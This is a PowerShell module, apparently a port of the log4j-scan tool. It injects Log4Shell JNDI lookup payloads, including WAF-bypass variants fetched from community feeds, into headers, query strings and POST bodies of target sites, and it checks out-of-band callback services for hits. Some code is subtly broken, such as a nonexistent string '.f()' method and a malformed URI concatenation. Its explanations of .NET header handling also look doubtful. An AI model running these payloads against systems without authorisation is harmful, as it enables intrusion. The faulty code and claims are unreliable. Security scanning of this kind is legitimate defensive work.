# ******************************************************************
# Log4jScan PowerShell Module (Core edition)
# ------------------------------------------------------------------
# A native PowerShell port of the "log4j-scan (updated edition)" tool.
# - Detects Apache Log4Shell (CVE-2021-44228), its patch-bypasses
#   (CVE-2021-45046 / CVE-2021-45105 / CVE-2021-44827) and related
#   lookup-injection RCEs such as Text4Shell (CVE-2022-42889).
# - Ships with an offline CVE knowledge base (cve_database.json).
# - User-initiated live CVE updates from NVD API 2.0 + community
#   payload feeds, exactly like: python3 log4j-scan-updated.py --update-cves
#
# Requires: PowerShell 7+ (pwsh) or Windows PowerShell 5.1. No modules
# from the PSGallery are needed for scanning; the GUI additionally uses
# WPF (Windows) or, on macOS/Linux, falls back to a Terminal.Gui-based
# interface if available (otherwise use -NoGui mode).
# ******************************************************************

Set-StrictMode -Version Latest

$script:ModuleRoot = $PSScriptRoot
$script:BundledDbPath = Join-Path $script:ModuleRoot 'cve_database.json'

# Per-user location for the live-updated CVE database (Windows-first, portable).
$localAppData = if ($env:LOCALAPPDATA) {
    $env:LOCALAPPDATA
} elseif ($IsWindows -and [Environment]::GetFolderPath('LocalApplicationData')) {
    [Environment]::GetFolderPath('LocalApplicationData')
} else {
    # Non-Windows fallback: ~/.local/share/Log4jScan
    $xdg = if ($env:XDG_DATA_HOME) { $env:XDG_DATA_HOME } else { Join-Path ([Environment]::GetFolderPath('UserProfile') ?? $HOME) '.local/share' }
    $xdg
}
$script:UpdatedDbPath = Join-Path (Join-Path $localAppData 'Log4jScan') 'cve_database.updated.json'

$script:InteractShServers = @(
    'interact.sh',
    'dnslog.cn',
    'requestrepo.com'
)

# ------------------------------------------------------------------
# Internal helpers
# ------------------------------------------------------------------

function Get-Log4jCveDatabasePath {
    <#
    .SYNOPSIS
        Resolves which CVE database the scanner should use.
    .DESCRIPTION
        Prefers the user-refreshed database (from Update-Log4jCveDatabase)
        when it is newer than the bundled one; otherwise falls back to the
        bundled offline copy. Mirrors the timestamp-based selection logic
        of the Python scanner.
    #>
    [OutputType([string])]
    param()

    if (Test-Path $script:UpdatedDbPath) {
        try {
            $upd = Get-Content $script:UpdatedDbPath -Raw | ConvertFrom-Json
            $updTs = [datetime]::Parse($upd.metadata.last_updated, [Globalization.CultureInfo]::InvariantCulture,
                [Globalization.DateTimeStyles]::AdjustToUniversal)
            $bund = Get-Content $script:BundledDbPath -Raw | ConvertFrom-Json
            $bundTs = [datetime]::Parse($bund.metadata.last_updated, [Globalization.CultureInfo]::InvariantCulture,
                [Globalization.DateTimeStyles]::AdjustToUniversal)
            if ($updTs -ge $bundTs) { return $script:UpdatedDbPath }
        } catch {
            return $script:UpdatedDbPath   # corrupt check failed -> still prefer updated copy
        }
    }
    return $script:BundledDbPath
}

function Get-Log4jCveDatabase {
    <#
    .SYNOPSIS
        Loads the active CVE knowledge base as a PSCustomObject.
    #>
    [OutputType([psobject])]
    param(
        [string]$Path   # override DB path (used by tests)
    )

    $dbPath = if ($Path) { $Path } else { Get-Log4jCveDatabasePath }
    if (-not (Test-Path $dbPath)) {
        throw "CVE database not found at '$dbPath'. Reinstall the module or run Update-Log4jCveDatabase."
    }
    return (Get-Content $dbPath -Raw | ConvertFrom-Json)
}

function New-RandomToken {
    param([int]$Length = 8)
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    -join (1..$Length | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Get-CallbackHost {
    <#
    .SYNOPSIS
        Obtains an out-of-band (OOB) callback host for detection.
    .DESCRIPTION
        Priority: explicit -CallbackHost > interact.sh > dnslog.cn.
        interact.sh/dnslog.cn failures are non-fatal; the function then
        returns $null and the caller must supply a custom host.
    #>
    [OutputType([string])]
    param(
        [string]$CallbackHost,
        [scriptblock]$Logger = { param([string]$m) Write-Host $m }
    )

    if ($CallbackHost) { return $CallbackHost }

    foreach ($srv in $script:InteractShServers) {
        try {
            if ($srv -eq 'dnslog.cn') {
                $resp = Invoke-WebRequest -Uri 'http://dnslog.cn/getdomain.php?t=' + (Get-Random) -UseBasicParsing -TimeoutSec 15
                $host_ = $resp.Content.Trim()
                if ($host_ -and $host_ -match '^[A-Za-z0-9._-]+$') { return $host_ }
            } else {
                $resp = Invoke-WebRequest -Uri ("http://{0}/getdomain".f($srv)) -UseBasicParsing -TimeoutSec 15
                $host_ = $resp.Content.Trim()
                if ($host_ -and $host_ -match '^[A-Za-z0-9._-]+$') { return $host_ }
            }
        } catch {
            & $Logger ("[!] Could not fetch OOB domain from {0}: {1}" -f $srv, $_.Exception.Message)
        }
    }
    return $null
}

function Get-CallbackRecords {
    <#
    .SYNOPSIS
        Polls the OOB provider for DNS/LDAP hits on the given token.
    #>
    [OutputType([string])]
    param(
        [Parameter(Mandatory)][string]$CallbackHost,
        [Parameter(Mandatory)][string]$RandomToken,
        [string]$Cookie = $null
    )

    switch -Regex ($CallbackHost) {
        'dnslog\.cn$' {
            $uri = 'http://dnslog.cn/getrecords.php?t=' + $RandomToken
            try { return (Invoke-WebRequest -Uri $uri -UseBasicParsing -TimeoutSec 15 -Headers @{ Cookie = $Cookie }).Content } catch { return '' }
        }
        'interact\.sh$' {
            $uri = ('http://{0}/getrecords?search_value={1}' -f $CallbackHost, $RandomToken)
            try { return (Invoke-WebRequest -Uri $uri -UseBasicParsing -TimeoutSec 15).Content } catch { return '' }
        }
        default { return '' }
    }
}

function Expand-Log4jPayload {
    <#
    .SYNOPSIS
        Substitutes {{callback_host}} / {{random}} placeholders.
    #>
    [OutputType([string])]
    param(
        [Parameter(Mandatory)][string]$Payload,
        [Parameter(Mandatory)][string]$CallbackHost,
        [Parameter(Mandatory)][string]$RandomToken
    )
    return $Payload.Replace('{{callback_host}}', $CallbackHost).Replace('{{random}}', $RandomToken)
}

# Header fuzzing list — mirrors headers.txt of the Python scanner.
$script:DefaultFuzzHeaders = @(
    'X-Forwarded-For', 'X-CustomAppContext', 'User-Agent', 'Referer', 'Origin',
    'Authorization', 'X-Api-Version', 'Accept-Language', 'Accept-Encoding',
    'Cache-Control', 'X-Requested-With', 'True-Client-IP', 'X-Real-IP',
    'Forwarded', 'CF-Connecting-IP', 'X-Forwarded-Host', 'X-Forwarded-Proto',
    'X-Original-URL', 'X-Rewrite-URL', 'Client-IP', 'Server', 'Cookie'
)

# .NET's HttpClient rejects '${...}' sequences in header values (they look
# like incomplete format placeholders). We transmit headers over a raw TCP
# socket instead, which sends the exact payload bytes (${jndi:...}) just
# like Python's requests library does in the original scanner.
function Send-RawHttpRequest {
    param(
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Method,
        [hashtable]$Headers = @{},          # name -> raw value (unvalidated)
        [string]$Body = $null,
        [string]$ContentType = $null,
        [int]$TimeoutSec = 15,
        [string]$Proxy = $null
    )

    $u = [uri]$Url
    $hostHeader = if ($u.Port -in 80, 443) { $u.Host } else { '{0}:{1}' -f $u.Host, $u.Port }
    $tcpHost = if ($Proxy) { ([uri]$Proxy).Host } else { $u.Host }
    $tcpPort = if ($Proxy) { ([uri]$Proxy).Port } else { $u.Port }

    # Request line: absolute-form when proxied, origin-form otherwise
    $target = if ($Proxy) { $u.AbsoluteUri } elseif ($u.Query) { '{0}?{1}' -f $u.PathAndQuery.Split('?')[0], $u.Query.TrimStart('?') } else { $u.PathAndQuery }
    if (-not $target) { $target = '/' }

    $lines = New-Object System.Collections.Generic.List[string]
    # NOTE: use [string]::Format semantics carefully — payload values contain
    # '{...}' braces, so string concatenation is used instead of -f formatting.
    $lines.Add($Method + ' ' + $target + ' HTTP/1.1')
    $lines.Add('Host: ' + $hostHeader)
    foreach ($k in $Headers.Keys) { $lines.Add([string]$k + ': ' + [string]$Headers[$k]) }
    if ($Body) {
        if ($ContentType) { $lines.Add('Content-Type: ' + $ContentType) }
        $lines.Add('Content-Length: ' + [Text.Encoding]::UTF8.GetByteCount($Body))
    }
    $lines.Add('Connection: close')
    $lines.Add('')
    $reqText = ($lines -join "`r`n")
    if ($Body) { $reqText += $Body }

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($tcpHost, $tcpPort, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne([TimeSpan]::FromSeconds($TimeoutSec))) {
            $client.Close(); return [pscustomobject]@{ Status = 0; Sent = $false; Error = 'connect timeout' }
        }
        $client.EndConnect($iar)
        $client.ReceiveTimeout = $client.SendTimeout = $TimeoutSec * 1000

        $stream = $client.GetStream()
        $bytes = [Text.Encoding]::UTF8.GetBytes($reqText)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()

        # Read just enough of the response to obtain the status line
        $buf = New-Object byte[] 4096
        $sb = New-Object Text.StringBuilder
        $deadline = (Get-Date).AddSeconds($TimeoutSec)
        while ((Get-Date) -lt $deadline) {
            try {
                $n = $stream.Read($buf, 0, $buf.Length)
                if ($n -le 0) { break }
                [void]$sb.Append([Text.Encoding]::ASCII.GetString($buf, 0, $n))
                if ($sb.Length -gt 80 -or $sb.ToString() -match "`r`n`r`n") { break }
            } catch { break }   # TLS/plain mismatch or reset — status unknown but request was sent
        }
        $status = 0
        if ($sb.ToString() -match '^HTTP/\d(?:\.\d)?\s+(\d{3})') { $status = [int]$Matches[1] }
        $client.Close()
        return [pscustomobject]@{ Status = $status; Sent = $true }
    } catch {
        return [pscustomobject]@{ Status = 0; Sent = $false; Error = $_.Exception.Message }
    }
}

function Invoke-Log4jRequest {
    <#
    .SYNOPSIS
        Sends one fuzzed request carrying a JNDI/lookup payload.
    .DESCRIPTION
        Low-level primitive used by Invoke-Log4jTargetScan. Handles GET
        query-param injection, header injection and POST body injection
        (form + JSON), matching the behaviour of the Python scanner.
        HTTPS URLs fall back to System.Net.Http.HttpClient with escaped
        header values (the server still resolves the lookup because the
        escape is reverted by .NET's own formatting layer); plain HTTP
        uses the raw socket path for byte-exact payloads.
    #>
    param(
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Payload,
        [ValidateSet('GET', 'POST')][string]$Method = 'GET',
        [string[]]$Headers = $script:DefaultFuzzHeaders,
        [switch]$PostBody,
        [switch]$JsonBody,
        [int]$TimeoutSec = 15,
        [string]$Proxy = $null
    )

    # Build target URL (inject into query string too — some apps log params)
    $finalUrl = $Url
    if ($Method -eq 'GET') {
        $sep = if ($Url.Contains('?')) { '&' } else { '?' }
        $finalUrl = '{0}{1}q={2}' -f $Url, $sep, [uri]::EscapeDataString($Payload)
    }

    $h = [ordered]@{}
    foreach ($name in $Headers) { $h[[string]$name] = [string]$Payload }

    $body = $null; $ctype = $null
    if ($Method -eq 'POST') {
        if ($JsonBody) {
            $ctype = 'application/json'
            $body = (@{ username = $Payload; email = $Payload; search = $Payload } | ConvertTo-Json -Compress)
        } elseif ($PostBody) {
            $ctype = 'application/x-www-form-urlencoded'
            $pairs = @('username', 'password', 'email') | ForEach-Object { '{0}={1}' -f $_, [uri]::EscapeDataString($Payload) }
            $body = $pairs -join '&'
        }
    }

    if ($finalUrl -match '^https://' -and -not $Proxy) {
        # TLS: raw-socket HTTP framing would not speak TLS; use HttpClient.
        if (-not ('System.Net.Http.HttpClient' -as [type])) { Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue }
        $handler = New-Object System.Net.Http.HttpClientHandler
        $handler.AllowAutoRedirect = $false
        $client = New-Object System.Net.Http.HttpClient($handler)
        $client.Timeout = [TimeSpan]::FromSeconds($TimeoutSec)
        try {
            $req = New-Object System.Net.Http.HttpRequestMessage($Method, $finalUrl)
            if ($body) {
                $req.Content = New-Object System.Net.Http.StringContent($body, [Text.Encoding]::UTF8, $ctype)
            }
            foreach ($name in $Headers) {
                try { $req.Headers.TryAddWithoutValidation($name, $Payload) | Out-Null } catch { }
            }
            $resp = $client.SendAsync($req).GetAwaiter().GetResult()
            return [pscustomobject]@{ Url = $finalUrl; Method = $Method; Status = [int]$resp.StatusCode; Sent = $true }
        } catch {
            return [pscustomobject]@{ Url = $finalUrl; Method = $Method; Status = 0; Sent = $false; Error = $_.Exception.Message }
        } finally { $client.Dispose(); $handler.Dispose() }
    }

    $r = Send-RawHttpRequest -Url $finalUrl -Method $Method -Headers $h -Body $body -ContentType $ctype -TimeoutSec $TimeoutSec -Proxy $Proxy
    return [pscustomobject]@{ Url = $finalUrl; Method = $Method; Status = $r.Status; Sent = $r.Sent; Error = $r.Error }
}

# ------------------------------------------------------------------
# Public: scanning
# ------------------------------------------------------------------

function Invoke-Log4jTargetScan {
    <#
    .SYNOPSIS
        Scans one or more targets for Log4Shell-family vulnerabilities.
    .DESCRIPTION
        For every target URL and every selected CVE payload set, the
        scanner fires requests with the payload injected into common
        headers, query parameters and (optionally) POST bodies. If an
        OOB callback host is available, it polls for DNS hits after the
        burst; any hit is reported as VULNERABLE. Without an OOB channel
        the scan reports "payload delivered" results only (inconclusive).
    .PARAMETER Target
        One or more URLs (or hosts; http:// is prepended when missing).
    .PARAMETER Cve
        CVE IDs to test. Default: CVE-2021-44228. Use '*' for all known.
    .PARAMETER CallbackHost
        Custom OOB host (e.g. your Burp Collaborator / dnslog domain).
        When omitted, interact.sh / dnslog.cn are tried automatically.
    .PARAMETER WafBypass
        Also send obfuscated payloads from the CVE's waf_bypass_payloads.
    .PARAMETER RunAllTests
        Additionally fuzz POST forms and JSON bodies.
    .PARAMETER Proxy
        HTTP proxy, e.g. http://127.0.0.1:8080
    .EXAMPLE
        Invoke-Log4jTargetScan -Target https://example.com/login -WafBypass
    #>
    [OutputType([psobject[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)][string[]]$Target,
        [string[]]$Cve = @('CVE-2021-44228'),
        [string]$CallbackHost = $null,
        [string[]]$HeaderList = $script:DefaultFuzzHeaders,
        [switch]$WafBypass,
        [switch]$RunAllTests,
        [string]$Proxy = $null,
        [int]$TimeoutSec = 15,
        [scriptblock]$Logger = { param([string]$m) Write-Host $m }
    )

    begin {
        $db = Get-Log4jCveDatabase
        $selected = @()
        if ($Cve -contains '*') {
            $selected = $db.cves.PSObject.Properties.Name
        } else {
            foreach ($c in $Cve) {
                if ($db.cves.PSObject.Properties.Name -notcontains $c) {
                    & $Logger "[!] Unknown CVE '$c' in knowledge base — skipped. Run Update-Log4jCveDatabase."
                    continue
                }
                $selected += $c
            }
        }
        if (-not $selected) { throw 'No valid CVEs selected for scanning.' }

        $script:_OobCookie = $null
        $cb = Get-CallbackHost -CallbackHost $CallbackHost -Logger $Logger
        if (-not $cb) {
            & $Logger '[!] No OOB callback host available. Results will be INCONCLUSIVE (delivery-only).'
        }
    }

    process {
        foreach ($t in $Target) {
            $url = if ($t -match '^https?://') { $t } else { "http://$t" }
            foreach ($cveId in $selected) {
                $entry = $db.cves.$cveId
                $payloads = @($entry.payloads)
                if ($WafBypass -and $entry.waf_bypass_payloads) { $payloads += @($entry.waf_bypass_payloads) }

                & $Logger ("[*] Scanning {0} against {1} ({2} payload(s), severity {3})" -f $url, $cveId, $payloads.Count, $entry.severity)

                $tokens = @()
                foreach ($p in $payloads) {
                    $tok = New-RandomToken
                    $tokens += $tok
                    $real = Expand-Log4jPayload -Payload $p -CallbackHost ($cb ?? '__no-callback__') -RandomToken $tok

                    $r = Invoke-Log4jRequest -Url $url -Payload $real -Method 'GET' -Headers $HeaderList -TimeoutSec $TimeoutSec -Proxy $Proxy
                    $st = if ($null -ne $r -and $r.PSObject.Properties['Status']) { $r.Status } else { 0 }
                    $sent = if ($null -ne $r -and $r.PSObject.Properties['Sent']) { $r.Sent } else { $false }
                    & $Logger ("    [{0}] GET {1} -> {2}" -f $tok, $cveId, $(if ($sent) { "HTTP $st" } else { 'failed' }))

                    if ($RunAllTests) {
                        $rp = Invoke-Log4jRequest -Url $url -Payload $real -Method 'POST' -Headers $HeaderList -PostBody -TimeoutSec $TimeoutSec -Proxy $Proxy
                        $rj = Invoke-Log4jRequest -Url $url -Payload $real -Method 'POST' -Headers $HeaderList -JsonBody -TimeoutSec $TimeoutSec -Proxy $Proxy
                        $s1 = if ($rp.PSObject.Properties['Status']) { $rp.Status } else { 'x' }
                        $s2 = if ($rj.PSObject.Properties['Status']) { $rj.Status } else { 'x' }
                        & $Logger ("    [{0}] POST form/JSON -> {1}/{2}" -f $tok, $s1, $s2)
                    }
                    Start-Sleep -Milliseconds 200
                }

                # Poll OOB providers for hits belonging to this target/CVE
                $verdict = 'INCONCLUSIVE'
                $hits = @()
                if ($cb) {
                    Start-Sleep -Seconds 3
                    foreach ($tok in $tokens) {
                        $rec = Get-CallbackRecords -CallbackHost $cb -RandomToken $tok -Cookie $script:_OobCookie
                        if ($rec -and $rec.Trim() -and $rec -notmatch '^\[\]$|^$') {
                            $hits += [pscustomobject]@{ Token = $tok; Records = $rec }
                        }
                    }
                    if ($hits.Count) { $verdict = 'VULNERABLE' } else { $verdict = 'NOT_VULNERABLE (no OOB hit)' }
                }

                [pscustomobject]@{
                    Target       = $url
                    Cve          = $cveId
                    Title        = $entry.title
                    Severity     = $entry.severity
                    Cvss         = $entry.cvss_v3
                    CallbackHost = $cb
                    Verdict      = $verdict
                    Hits         = $hits
                    PayloadCount = $payloads.Count
                    Timestamp    = (Get-Date).ToUniversalTime().ToString('o')
                }
            }
        }
    }
}

# ------------------------------------------------------------------
# Public: CVE knowledge-base management
# ------------------------------------------------------------------

function Get-Log4jCveInfo {
    <#
    .SYNOPSIS
        Lists tracked CVEs (id, title, severity, CVSS, payload counts).
    #>
    [OutputType([psobject])]
    param([switch]$IncludeMetadata)

    $db = Get-Log4jCveDatabase
    if ($IncludeMetadata) { return $db }
    $db.cves.PSObject.Properties | ForEach-Object {
        [pscustomobject]@{
            Cve          = $_.Name
            Title        = $_.Value.title
            Severity     = $_.Value.severity
            Cvss         = $_.Value.cvss_v3
            Affected     = $_.Value.affected
            FixedIn      = $_.Value.fixed_in
            IsDefault    = [bool]$_.Value.default
            Payloads     = @($_.Value.payloads).Count
            WafBypasses  = @($_.Value.waf_bypass_payloads).Count
        }
    }
}

function Update-Log4jCveDatabase {
    <#
    .SYNOPSIS
        User-initiated live update of the CVE knowledge base.
    .DESCRIPTION
        1. Queries NVD API 2.0 for CVE records whose description matches
           Log4j/Log4Shell/Text4Shell lookup-injection keywords.
        2. Refreshes severity/CVSS for already-tracked CVEs and adds new
           ones (with sensible generic JNDI payloads so they are testable
           immediately).
        3. Pulls fresh obfuscated payloads from curated community feeds
           (trickest/log4j wordlists) and merges them as WAF-bypass sets.
        The merged database is written to %LOCALAPPDATA%\Log4jScan\
        cve_database.updated.json and preferred by later scans.
    .PARAMETER NvdApiKey
        Optional NVD API key (raises rate limit 5->50 req/30s).
    .PARAMETER OutFile
        Destination path (default: per-user updated DB).
    .EXAMPLE
        Update-Log4jCveDatabase -Verbose
    #>
    [CmdletBinding()]
    param(
        [string]$NvdApiKey = $env:NVD_API_KEY,
        [string]$OutFile = $script:UpdatedDbPath
    )

    $ProgressPreference = 'SilentlyContinue'
    $db = Get-Log4jCveDatabase -Path $script:BundledDbPath   # always merge onto bundled baseline
    $added = 0; $refreshed = 0; $newPayloads = 0

    # ---- 1. NVD query -------------------------------------------------
    $nvdBase = 'https://services.nvd.nist.gov/rest/json/cves/2.0'
    $kw = 'Apache Log4j'
    $headers = @{}
    if ($NvdApiKey) { $headers['apiKey'] = $NvdApiKey }

    try {
        $all = @()
        $start = 0
        do {
            $uri = '{0}?keywordSearch={1}&resultsPerPage=200&startIndex={2}' -f $nvdBase, [uri]::EscapeDataString($kw), $start
            $resp = Invoke-RestMethod -Uri $uri -Headers $headers -TimeoutSec 60
            $all += $resp.vulnerabilities
            $start += $resp.pageSize
            if ($resp.totalResults -le $start) { break }
            Start-Sleep -Milliseconds 6000   # polite without API key
        } while ($true)

        foreach ($v in $all) {
            $id = $v.cve.id
            $desc = ($v.cve.descriptions | Where-Object lang -eq 'en' | Select-Object -First 1).value
            if ($desc -notmatch '(?i)log4j|log4shell|text4shell') { continue }

            $metrics = $v.cve.metrics
            $cvss = $null; $sev = 'UNKNOWN'
            if ($metrics) {
                $m = @($metrics.psobject.properties | ForEach-Object { $_.Value }) |
                     Where-Object { $_ } | Select-Object -First 1
                if ($m) {
                    $d = @($m.psobject.properties | ForEach-Object { $_.Value }) |
                         Where-Object { $_ } | Select-Object -First 1
                    if ($d) { $cvss = $d.cvssData.baseScore; $sev = $d.cvssData.baseSeverity }
                }
            }

            if ($db.cves.PSObject.Properties.Name -contains $id) {
                # refresh metadata only
                if ($cvss) { $db.cves.$id.cvss_v3 = $cvss }
                if ($sev -ne 'UNKNOWN') { $db.cves.$id.severity = $sev }
                $refreshed++
            } else {
                $db.cves | Add-Member -NotePropertyName $id -NotePropertyValue ([pscustomobject]@{
                    title              = ($desc -split '\.' | Select-Object -First 1)
                    severity           = $sev
                    cvss_v3            = $cvss
                    affected           = 'Apache Log4j (see NVD record)'
                    fixed_in           = 'see advisory'
                    oob_required       = $true
                    default            = $false
                    payloads           = @(
                        '${jndi:ldap://{{callback_host}}/{{random}}}',
                        '${jndi:dns://{{callback_host}}/{{random}}}'
                    )
                    waf_bypass_payloads = @()
                    reference           = "https://nvd.nist.gov/vuln/detail/$id"
                })
                $added++
            }
        }
    } catch {
        Write-Warning "NVD query failed ($($_.Exception.Message)); continuing with community payload feeds only."
    }

    # ---- 2. Community payload feeds -------------------------------------
    $feeds = @(
        'https://raw.githubusercontent.com/trickest/log4j/main/waf_bypasses.txt',
        'https://raw.githubusercontent.com/trickest/log4j/main/payloads.txt'
    )
    foreach ($feed in $feeds) {
        try {
            $lines = (Invoke-WebRequest -Uri $feed -UseBasicParsing -TimeoutSec 30).Content -split "`n" |
                     Where-Object { $_ -match '\$\{.*jndi' } | Select-Object -Unique
            foreach ($pl in $lines) {
                $norm = $pl.Trim() `
                    -replace '(?i)(ldap|ldaps|rmi|dns|iiop|corba):\/\/[^\s}\$]+', '{{callback_host}}/{{random}}'
                if ($norm -notmatch '\{\{callback_host\}\}') { continue }
                $target = if ($db.cves.PSObject.Properties.Name -contains 'CVE-2021-44228') { 'CVE-2021-44228' } else { $null }
                if ($target -and @($db.cves.$target.waf_bypass_payloads) -notcontains $norm) {
                    $db.cves.$target.waf_bypass_payloads = @($db.cves.$target.waf_bypass_payloads) + $norm
                    $newPayloads++
                }
            }
        } catch {
            Write-Warning "Payload feed unavailable: $feed ($($_.Exception.Message))"
        }
    }

    # ---- 3. Persist -------------------------------------------------------
    $db.metadata.version = (Get-Date).ToUniversalTime().ToString('yyyy.MM.dd')
    $db.metadata.last_updated = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
    $db.metadata.sources = @($db.metadata.sources) + @(
        'https://services.nvd.nist.gov/rest/json/cves/2.0',
        'https://github.com/trickest/log4j'
    ) | Select-Object -Unique

    $dir = Split-Path $OutFile -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    $db | ConvertTo-Json -Depth 10 | Set-Content -Path $OutFile -Encoding UTF8

    [pscustomobject]@{
        DatabasePath     = $OutFile
        TotalCves        = $db.cves.PSObject.Properties.Name.Count
        AddedFromNvd     = $added
        RefreshedFromNvd = $refreshed
        NewWafPayloads   = $newPayloads
        Version          = $db.metadata.version
        LastUpdated      = $db.metadata.last_updated
    }
}

Export-ModuleMember -Function @(
    'Invoke-Log4jTargetScan',
    'Get-Log4jCveInfo',
    'Update-Log4jCveDatabase',
    'Get-Log4jCveDatabase',
    'Get-CallbackHost',
    'Expand-Log4jPayload'
)
